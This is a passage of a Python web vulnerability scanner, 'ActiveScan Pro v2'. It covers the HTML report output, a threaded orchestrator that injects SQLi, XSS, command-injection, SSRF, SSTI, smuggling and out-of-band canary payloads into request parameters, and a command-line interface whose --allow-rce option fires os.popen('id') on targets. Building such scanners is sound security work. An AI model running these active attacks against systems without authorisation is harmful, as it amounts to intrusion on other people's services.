    for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
        n   = counts.get(sev, 0)
        col = SEV_HEX[sev]
        cards_html += (
            f'<div style="background:#161b22;border:1px solid {col}44;border-radius:8px;'
            f'padding:14px 20px;text-align:center;min-width:90px">'
            f'<div style="font-size:22px;font-weight:700;color:{col}">{n}</div>'
            f'<div style="font-size:10px;color:#8b949e;margin-top:2px">{sev}</div></div>'
        )

    filter_btns = '<button class="fb active" data-sev="ALL" onclick="flt(this)">All ({n})</button> '.format(n=len(issues))
    for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
        if counts.get(sev, 0):
            col = SEV_HEX[sev]
            filter_btns += (
                f'<button class="fb" data-sev="{sev}" onclick="flt(this)" '
                f'style="border-color:{col}55;color:{col}">{sev} ({counts[sev]})</button> '
            )

    waf_banner = ""
    if waf_info:
        waf_banner = (
            f'<div style="background:#ff880015;border:1px solid #ff880044;border-radius:6px;'
            f'padding:10px 14px;margin-bottom:18px;font-size:12px;color:#ff8800">'
            f'🛡️ <strong>WAF Detected:</strong> {_html.escape(waf_info)} — '
            f'Some payloads may have been blocked. Verify findings manually.</div>'
        )

    return f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<title>ActiveScan Pro v2 — Report</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:-apple-system,'Segoe UI',sans-serif;background:#0d1117;color:#e6edf3;padding:28px 32px}}
h1{{font-size:20px;font-weight:700;color:#f85149;margin-bottom:4px}}
.meta{{color:#8b949e;font-size:12px;margin-bottom:22px}}
.cards{{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:22px}}
.filters{{display:flex;gap:7px;flex-wrap:wrap;margin-bottom:16px;align-items:center}}
.fb{{background:#161b22;border:1px solid #30363d;border-radius:4px;padding:4px 12px;
     font-size:12px;cursor:pointer;color:#8b949e;transition:opacity .15s}}
.fb.active{{opacity:1;font-weight:700;color:#e6edf3}}
.fb:not(.active){{opacity:.5}}
table{{width:100%;border-collapse:collapse;background:#161b22;border-radius:8px;overflow:hidden;font-size:13px}}
th{{background:#21262d;padding:9px 12px;text-align:left;font-size:10px;
    text-transform:uppercase;color:#8b949e;letter-spacing:.5px}}
td{{padding:9px 12px;border-bottom:1px solid #21262d;vertical-align:top}}
tr.ir:hover td{{background:#21262d55}}
.url{{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:10px 14px;
      font-family:monospace;font-size:12px;color:#79c0ff;margin-bottom:20px;word-break:break-all}}
code{{font-family:'Consolas',monospace}}
pre{{font-family:'Consolas',monospace}}
</style></head><body>
<h1>🔍 ActiveScan Pro v2 — Security Report</h1>
<div class="meta">
  Generated: {time.strftime('%Y-%m-%d %H:%M:%S')} &nbsp;|&nbsp;
  Scan time: {scan_time:.1f}s &nbsp;|&nbsp;
  Total issues: {len(issues)} &nbsp;|&nbsp;
  Modules: {len(_ALL_MODULES)}
</div>
<div class="url">🌐 {_html.escape(req.url)}</div>
{waf_banner}
<div class="cards">{cards_html}</div>
<div class="filters">{filter_btns}</div>
<table>
  <thead><tr>
    <th>#</th><th>Severity</th><th>Vulnerability</th>
    <th>Parameter</th><th>Payload</th><th>Evidence</th>
  </tr></thead>
  <tbody id="tb">{rows_html}</tbody>
</table>
<script>
function flt(b){{
  document.querySelectorAll('.fb').forEach(x=>x.classList.remove('active'));
  b.classList.add('active');
  var s=b.dataset.sev;
  document.querySelectorAll('.ir,.ir-detail').forEach(r=>{{
    if(s==='ALL') r.style.display=r.classList.contains('ir-detail')?'none':'';
    else r.style.display=r.dataset.sev===s?(r.classList.contains('ir-detail')?'none':''):'none';
  }});
}}
function toggleDetail(row){{
  var next=row.nextElementSibling;
  if(next&&next.classList.contains('ir-detail')){{
    next.style.display=next.style.display==='none'?'':'none';
  }}
}}
</script>
</body></html>"""


# ─────────────────────────────────────────────────────────────────────────────
# SCAN ORCHESTRATOR  (multi-threaded, context-aware, dedup, profiles)
# ─────────────────────────────────────────────────────────────────────────────
def run_scan(
    curl_cmd: str,
    timeout:  int   = None,
    threads:  int   = None,
    proxy:    Optional[str] = None,
    delay:    float = 0.0,
    module_filter: Optional[Set[str]] = None,
    skip_modules:  Optional[Set[str]] = None,
    profile:       Optional[str] = None,
    oob_server:    Optional[str] = None,   # None = fall back to CFG.OOB_SERVER
    oob_token:     Optional[str] = None,
) -> Tuple[ScanRequest, List[Issue], float, str]:
    """Returns (request, issues, scan_time, waf_info)."""

    if timeout is None: timeout = CFG.HTTP_TIMEOUT
    if threads is None: threads = CFG.THREADS
    # OOB: explicit arg wins; otherwise fall back to environment-configured server.
    if oob_server is None: oob_server = CFG.OOB_SERVER
    if oob_token  is None: oob_token  = CFG.OOB_TOKEN

    t_start       = time.time()
    all_issues:   List[Issue] = []
    results_lock  = threading.Lock()
    waf_info      = ""

    # ── Determine allowed modules ─────────────────────────────
    allowed: Optional[Set[str]] = None
    if module_filter:
        allowed = module_filter
    elif profile and profile in SCAN_PROFILES:
        p = SCAN_PROFILES[profile]
        allowed = set(p) if p is not None else None
    if skip_modules and allowed:
        allowed -= skip_modules
    elif skip_modules:
        allowed = set(_ALL_MODULES.keys()) - skip_modules

    def mod_allowed(key):
        return allowed is None or key in allowed

    # ── Parse cURL ────────────────────────────────────────────
    tprint(f"\n{Fore.CYAN}[*] Parsing cURL...{Style.RESET_ALL}")
    req = CurlParser.parse(curl_cmd)
    if not req.url:
        tprint(f"{Fore.RED}[!] Could not find URL.{Style.RESET_ALL}")
        return req, [], 0.0, ""

    tprint(f"    URL     : {Fore.YELLOW}{req.url}{Style.RESET_ALL}")
    tprint(f"    Method  : {req.method}")
    if req.body:      tprint(f"    Body    : {req.body[:80]}")
    if proxy:         tprint(f"    Proxy   : {proxy}")
    if profile:       tprint(f"    Profile : {Fore.CYAN}{profile}{Style.RESET_ALL}")
    if allowed:       tprint(f"    Modules : {Fore.CYAN}{', '.join(sorted(allowed))}{Style.RESET_ALL}")
    if oob_server:    tprint(f"    OOB     : {Fore.CYAN}{oob_server}{Style.RESET_ALL}")

    # ── OOB Handler (early init so canary domain is ready for injection) ──
    oob_handler: Optional[OOBHandler] = None
    if oob_server is not None:
        oob_handler = OOBHandler(server=oob_server, token=oob_token)

    ct = req.headers.get('Content-Type', req.headers.get('content-type', ''))

    # ── Insertion points + context analysis ───────────────────
    points = get_insertion_points(req)
    tprint(f"\n{Fore.CYAN}[*] Insertion Points ({len(points)}) + Context:{Style.RESET_ALL}")
    for p in points:
        mods  = get_modules_for_point(p, ct)
        vtype = _value_type(str(p['value']))
        hint  = _name_hint(p['name']) or vtype
        tprint(
            f"    ├─ [{p['type'].upper():14}] {p['name']:<20}"
            f"  context={Fore.CYAN}{hint:<12}{Style.RESET_ALL}"
            f"  → {Fore.YELLOW}{', '.join(mods)}{Style.RESET_ALL}"
        )

    # ── Baseline + timing calibration ─────────────────────────
    sender = RequestSender(req, timeout=timeout, proxy=proxy, delay=delay)
    tprint(f"\n{Fore.CYAN}[*] Baseline (×3 for timing + content calibration)...{Style.RESET_ALL}")
    base = sender.baseline()
    if base:
        tprint(
            f"{Fore.GREEN}    HTTP {base.status_code} | {len(base.text)}B | "
            f"median {sender.baseline_median:.2f}s | "
            f"len_std {sender.baseline_len_stdev:.0f}B{Style.RESET_ALL}"
        )
    else:
        tprint(f"{Fore.RED}    [!] Baseline failed — check URL / connectivity{Style.RESET_ALL}")

    # ── WAF detection (ARCH-03) ───────────────────────────────
    waf_info = WAFDetector.detect(base) or ""
    if waf_info:
        tprint(f"\n{Fore.YELLOW}[!] WAF Detected: {waf_info}"
               f" — some payloads may be blocked{Style.RESET_ALL}")
        with results_lock:
            all_issues.append(Issue("INFO", "WAF Detected", "infrastructure",
                                    "N/A", f"WAF: {waf_info}", req.url))

    # ── Passive checks ────────────────────────────────────────
    tprint(f"\n{Fore.CYAN}[*] Passive Checks (no extra requests)...{Style.RESET_ALL}")
    passive = PassiveChecker().check(req, base)
    with results_lock:
        all_issues.extend(passive)
    tprint(f"    → {len(passive)} passive issue(s)")

    if profile == 'passive':
        dummy_ep = {'type': 'endpoint', 'name': 'endpoint', 'value': ''}
        if mod_allowed('exposure'):
            extra = _ALL_MODULES['exposure'].scan(sender, dummy_ep, base)
            with results_lock:
                all_issues.extend(extra)
            tprint(f"    → {len(extra)} data-exposure issue(s)")
        tprint(f"{Fore.YELLOW}[*] Profile=passive — skipping active modules.{Style.RESET_ALL}")
        return req, all_issues, time.time() - t_start, waf_info

    if not points and not any(mod_allowed(k) for k in _ENDPOINT_MODULES):
        tprint(f"{Fore.YELLOW}[!] No injection points — active scan skipped.{Style.RESET_ALL}")
        return req, all_issues, time.time() - t_start, waf_info

    # ── Build task list (context-aware) ───────────────────────
    tasks: List[Tuple[Dict, str, object]] = []
    for point in points:
        mods = get_modules_for_point(point, ct)
        for mk in mods:
            if mk in _ALL_MODULES and mk not in _ENDPOINT_MODULES and mod_allowed(mk):
                tasks.append((point, mk, _ALL_MODULES[mk]))

    # JWT — auto-detect in any header/cookie (BUG-01 FIX)
    if mod_allowed('jwt'):
        jwt_mod = _ALL_MODULES["jwt"]
        jwt_added = False
        # Check insertion points
        for point in points:
            if point['type'] in ('header', 'cookie'):
                v = str(point.get('value', ''))
                v_clean = re.sub(r'^Bearer\s+', '', v, flags=re.I).strip()
                if len(v_clean.split('.')) == 3 and v_clean.startswith('eyJ'):
                    tasks.append((point, 'jwt', jwt_mod)); jwt_added = True; break
        # BUG-01: Also check headers that were skipped (>60 chars)
        if not jwt_added:
            for hname, hval in req.headers.items():
                if hname.lower() == 'authorization':
                    clean = re.sub(r'^Bearer\s+', '', hval, flags=re.I).strip()
                    if len(clean.split('.')) == 3 and clean.startswith('eyJ'):
                        dummy = {'type': 'header', 'name': hname, 'value': hval}
                        tasks.append((dummy, 'jwt', jwt_mod)); break

    # Endpoint-level modules
    dummy_ep = {'type': 'endpoint', 'name': 'endpoint', 'value': ''}

    if mod_allowed('cors'):
        tasks.append((dummy_ep, 'cors', _ALL_MODULES['cors']))

    if mod_allowed('smuggling'):
        tasks.append((dummy_ep, 'smuggling', _ALL_MODULES['smuggling']))

    if mod_allowed('hosthdr'):
        tasks.append((dummy_ep, 'hosthdr', _ALL_MODULES['hosthdr']))

    # CSRF — only meaningful for state-changing, cookie-authenticated requests
    if mod_allowed('csrf') and req.method.upper() in CSRFScanner._STATE_CHANGING:
        tasks.append((dummy_ep, 'csrf', _ALL_MODULES['csrf']))

    # BFLA / method-override — same token; scanner skips when no auth
    if mod_allowed('authz'):
        tasks.append((dummy_ep, 'authz', _ALL_MODULES['authz']))

    if mod_allowed('exposure'):
        tasks.append((dummy_ep, 'exposure', _ALL_MODULES['exposure']))

    # API version probe — only add task when the URL actually contains a
    # recognisable version segment (no point running it on unversioned paths)
    _av_mod = _ALL_MODULES['api_version']
    if mod_allowed('api_version') and _av_mod._detect(urllib.parse.urlparse(req.url).path):
        tasks.append((dummy_ep, 'api_version', _av_mod))

    if mod_allowed('graphql') and GraphQLScanner()._is_graphql(req):
        tasks.append((dummy_ep, 'graphql', _ALL_MODULES['graphql']))

    if mod_allowed('prototype_pollution') and (
            any(p['type'] == 'body_json' for p in points)
            or urllib.parse.urlparse(req.url).query):
        tasks.append((dummy_ep, 'prototype_pollution', _ALL_MODULES['prototype_pollution']))

    if mod_allowed('massassign'):
        json_pts = [p for p in points if p['type'] == 'body_json']
        if json_pts:
            tasks.append((json_pts[0], 'massassign', _ALL_MODULES['massassign']))
        elif req.method.upper() in MassAssignmentScanner._WRITABLE:
            dummy_ma = {
                'type': 'body_json', 'name': 'request body', 'value': '',
                '_root_json': {},
            }
            tasks.append((dummy_ma, 'massassign', _ALL_MODULES['massassign']))

    # Rate limiting: endpoint-level check + per-numeric-param business logic
    if mod_allowed('ratelimit'):
        rl_mod = _ALL_MODULES['ratelimit']
        tasks.append((dummy_ep, 'ratelimit', rl_mod))
        for p in points:
            if _value_type(str(p.get('value', ''))) == 'numeric':
                tasks.append((p, 'ratelimit', rl_mod))

    # New API Modules
    if mod_allowed('debug_params'):
        tasks.append((dummy_ep, 'debug_params', _ALL_MODULES['debug_params']))

    if mod_allowed('verb_tampering'):
        tasks.append((dummy_ep, 'verb_tampering', _ALL_MODULES['verb_tampering']))

    if mod_allowed('ip_spoofing'):
        tasks.append((dummy_ep, 'ip_spoofing', _ALL_MODULES['ip_spoofing']))

    if mod_allowed('content_type_tamper'):
        tasks.append((dummy_ep, 'content_type_tamper', _ALL_MODULES['content_type_tamper']))

    if mod_allowed('resource_exhaustion'):
        res_mod = _ALL_MODULES['resource_exhaustion']
        if not any(t[1] == 'resource_exhaustion' for t in tasks) and urllib.parse.urlparse(req.url).query:
            tasks.append((dummy_ep, 'resource_exhaustion', res_mod))

    total      = len(tasks)
    done_count = 0
    done_lock  = threading.Lock()

    tprint(f"\n{Fore.CYAN}[*] Active Scan — {total} context-filtered checks | "
           f"{threads} threads{Style.RESET_ALL}")

    def run_task(task):
        nonlocal done_count
        point, mod_key, module = task
        if sender._should_stop():
            with done_lock:
                done_count += 1
            return []
        try:
            found = module.scan(sender, point, base)
        except Exception as e:
            vprint(f"  {Fore.RED}[!] {mod_key} error on {point.get('name','?')}: {e}{Style.RESET_ALL}")
            found = []

        with done_lock:
            done_count += 1
            pct = int(done_count / total * 100)

        with results_lock:
            all_issues.extend(found)

        if found and not sender._should_stop():
            sev = found[0].severity
            col = SEV_COLOR.get(sev, Fore.WHITE)
            label = f"{point['type'].upper()}:{point.get('name','')} / {module.NAME}"
            tprint(f"  [{pct:3d}%] {col}✗ [{sev}]{Style.RESET_ALL} {label}")
        return found

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(run_task, t): t for t in tasks}
        for fut in as_completed(futures):
            if sender._should_stop():
                for f in futures:
                    f.cancel()
                tprint(f"  {Fore.YELLOW}[!] Scan aborted — cancelling remaining tasks"
                       f"{Style.RESET_ALL}")
                break
            try:
                fut.result()
            except Exception as e:
                tprint(f"  {Fore.RED}[!] Task error: {e}{Style.RESET_ALL}")

    # ── OOB Phase: inject canary payloads, then poll for DNS/HTTP callbacks ─
    # NOTE: OOB is NOT in _ALL_MODULES — it has a custom scan() signature and
    # is controlled solely by the --oob flag (oob_handler presence).
    # mod_allowed() is intentionally NOT used here; only --skip-module oob skips it.
    _oob_skipped = skip_modules and 'oob' in skip_modules
    if (oob_handler and oob_handler.enabled and not _oob_skipped
            and not sender._should_stop()):
        tprint(f"\n{Fore.CYAN}[*] OOB: Injecting canary payloads (blind CMDi / SSRF / SQLi / XXE)...{Style.RESET_ALL}")
        _oob_scan = OOBScanner()
        for p in points:
            if sender._should_stop():
                break
            try:
                _oob_scan.scan(sender, p, base, oob_handler)
            except Exception as e:
                tprint(f"  {Fore.RED}[!] OOB inject error ({p.get('name','?')}): {e}{Style.RESET_ALL}")

    if (oob_handler and oob_handler.enabled and not _oob_skipped
            and not sender._should_stop()):
        tprint(f"\n{Fore.CYAN}[*] OOB: Polling for interactions "
               f"(waiting up to {CFG.OOB_WAIT}s)...{Style.RESET_ALL}")
        try:
            oob_issues = oob_handler.poll_and_report(
                req.url, should_stop=sender._should_stop)
            if oob_issues:
                tprint(f"  {Fore.RED}[!] OOB: {len(oob_issues)} blind interaction(s) confirmed!{Style.RESET_ALL}")
            with results_lock:
                all_issues.extend(oob_issues)
        except Exception as e:
            tprint(f"  {Fore.RED}[!] OOB poll error: {e}{Style.RESET_ALL}")

    # ── BUG-06 FIX: Deduplicate by (vulnerability, parameter, param_type, url) ─
    # URL (without query) is part of the key so the SAME vuln on DIFFERENT
    # endpoints isn't collapsed into one finding when scanning multiple entries.
    seen: Set[Tuple[str, str, str, str]] = set()
    deduped: List[Issue] = []
    for iss in all_issues:
        _base_url = (iss.url or "").split("?", 1)[0]
        key = (iss.vulnerability, iss.parameter, iss.param_type, _base_url)
        if key not in seen:
            seen.add(key)
            deduped.append(iss)
    all_issues = deduped

    return req, all_issues, time.time() - t_start, waf_info


# ─────────────────────────────────────────────────────────────────────────────
# REPORTERS
# ─────────────────────────────────────────────────────────────────────────────
def print_issues(issues: List[Issue]):
    if not issues:
        print(f"\n{Fore.GREEN}[✓] No vulnerabilities detected.{Style.RESET_ALL}")
        return

    sorted_issues = sorted(issues, key=lambda x: SEV_ORDER.get(x.severity, 99))
    print(f"\n{'═'*70}")
    print(f"{Fore.CYAN}  SCAN RESULTS{Style.RESET_ALL}")
    print(f"{'═'*70}")

    for idx, iss in enumerate(sorted_issues, 1):
        col = SEV_COLOR.get(iss.severity, Fore.WHITE)
        print(f"\n  [{idx}] {col}[{iss.severity}] {iss.vulnerability}{Style.RESET_ALL}")
        print(f"       Parameter : {Fore.YELLOW}{iss.parameter}{Style.RESET_ALL}"
              f"  [{iss.param_type}]")
        print(f"       Payload   : {Fore.MAGENTA}{iss.payload[:80]}{Style.RESET_ALL}")
        print(f"       Evidence  : {iss.evidence}")
        print(f"       URL       : {iss.url[:70]}")

    print(f"\n{'═'*70}")
    print(f"  SUMMARY")
    print(f"{'═'*70}")
    cnts = Counter(i.severity for i in issues)
    for s in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
        if s in cnts:
            print(f"  {SEV_COLOR[s]}{s:10}{Style.RESET_ALL}: {cnts[s]}")
    print()


def save_report(req: ScanRequest, issues: List[Issue],
                scan_time: float, path: str, waf_info: str = ""):
    if path.lower().endswith('.html'):
        content = gen_html_report(req, issues, scan_time, waf_info)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)
        print(f"{Fore.GREEN}[✓] HTML report → {path}{Style.RESET_ALL}")
    else:
        data = [vars(i) for i in issues]
        with open(path, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"{Fore.GREEN}[✓] JSON report → {path}{Style.RESET_ALL}")


# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────
def main():
    global _VERBOSE, _ALLOW_RCE
    print(BANNER)

    parser = argparse.ArgumentParser(
        description='ActiveScan Pro v2 — Context-aware security scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python Scan.py --file curl.txt --output report.html --threads 8
  python Scan.py --curl 'curl https://site.com/api?id=5' --proxy http://127.0.0.1:8080
  python Scan.py --profile quick --file curl.txt           # fast essential checks
  python Scan.py --profile api --file curl.txt             # API-focused modules
  python Scan.py --module sqli,xss,cors --file curl.txt    # specific modules only
  python Scan.py --skip-module idor,hpp --file curl.txt    # exclude modules
  python Scan.py --verbose --file curl.txt                 # detailed request logging
  python Scan.py --oob --file curl.txt                     # blind OOB via oast.pro
  python Scan.py --oob --oob-server interact.sh --oob-token <tok> --file curl.txt

Available modules:
  sqli, nosqli, xss, lfi, cmdi, ssrf, redirect, crlf, xxe, ssti,
  idor, jwt, massassign, cors, graphql, prototype_pollution, hpp,
  xpath, ldap, deserial, ratelimit, smuggling, api_version, hosthdr, csrf, authz, exposure
  oob  — Out-of-Band blind detection (requires --oob flag + interactsh-client)

Scan profiles:
  passive    — Security headers, disclosure, and live JSON data-exposure (0 extra requests)
  quick      — sqli, xss, ssrf, lfi, cors
  full       — All modules (default)
  api        — sqli, nosqli, idor, massassign, jwt, cors, graphql, hpp,
               prototype_pollution, ratelimit, smuggling, api_version, hosthdr, csrf, authz, exposure
  injection  — All injection modules (sqli, nosqli, xss, cmdi, ssti, xxe, xpath, ldap, lfi)
        """)
    parser.add_argument('--curl',    '-c', help='cURL command string')
    parser.add_argument('--file',    '-f', help='File containing a cURL command')
    parser.add_argument('--timeout', '-t', type=int,   default=10,
                        help='Per-request timeout in seconds (default: 10)')
    parser.add_argument('--threads', '-n', type=int,   default=6,
                        help='Parallel scan threads (default: 6)')
    parser.add_argument('--output',  '-o',
                        help='Save report — .html for full report, .json for raw data')
    parser.add_argument('--proxy',   '-p',
                        help='HTTP proxy URL (e.g. http://127.0.0.1:8080)')
    parser.add_argument('--delay',   '-D', type=float, default=0.0,
                        help='Delay between requests in seconds')
    # ARCH-01: Module selection
    parser.add_argument('--module',  '-m',
                        help='Run ONLY these modules (comma-separated)')
    parser.add_argument('--skip-module',
                        help='Skip these modules (comma-separated)')
    # ARCH-02: Scan profiles
    parser.add_argument('--profile',
                        choices=list(SCAN_PROFILES.keys()),
                        help='Scan profile preset')
    # ARCH-06: Verbose
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Show every request/response detail')
    parser.add_argument('--allow-rce', action='store_true',
                        help='Allow SSTI module to fire live RCE confirmation payloads '
                             '(e.g. os.popen(\'id\')) — only use with explicit authorization')
    # OOB: Interactsh-based blind detection
    parser.add_argument('--oob', action='store_true',
                        help='Enable Out-of-Band blind testing via interactsh '
                             '(requires: pip install interactsh-client)')
    parser.add_argument('--oob-server', default=None, metavar='HOST',
                        help='Private interactsh server hostname. '
                             'If omitted, falls back to public oast.pro with a warning.')
    parser.add_argument('--oob-token', default=None, metavar='TOKEN',
                        help='API token for private interactsh server')

    args = parser.parse_args()
    _VERBOSE = args.verbose
    _ALLOW_RCE = args.allow_rce
    if _ALLOW_RCE:
        tprint(f"{Fore.YELLOW}[!] --allow-rce enabled: SSTI module may execute live "
               f"commands (e.g. os.popen('id')) on the target.{Style.RESET_ALL}")

    # ── Read cURL ─────────────────────────────────────────────
    curl_cmd = None
    if args.curl:
        curl_cmd = args.curl
    elif args.file:
        with open(args.file) as f:
            curl_cmd = f.read().strip()
    else:
        print(f"{Fore.YELLOW}Paste your cURL command, then press Enter twice:{Style.RESET_ALL}")
        lines = []
        while True:
            try:   line = input()
            except EOFError: break
            if line == '' and lines: break
            lines.append(line)
        curl_cmd = ' '.join(lines).strip()

    if not curl_cmd:
        print(f"{Fore.RED}[!] No cURL command provided. Exiting.{Style.RESET_ALL}")
        return

    # ── Parse module/skip filters ─────────────────────────────
    mod_filter = set(args.module.split(',')) if args.module else None
    skip_mods  = set(args.skip_module.split(',')) if args.skip_module else None

    req, issues, scan_time, waf_info = run_scan(
        curl_cmd,
        timeout       = args.timeout,
        threads       = args.threads,
        proxy         = args.proxy,
        delay         = args.delay,
        module_filter = mod_filter,
        skip_modules  = skip_mods,
        profile       = args.profile,
        oob_server    = args.oob_server if args.oob else None,
        oob_token     = args.oob_token,
    )

    print_issues(issues)
    print(f"{Fore.CYAN}  Total scan time: {scan_time:.1f}s{Style.RESET_ALL}\n")

    if args.output:
        save_report(req, issues, scan_time, args.output, waf_info)


if __name__ == '__main__':
    main()
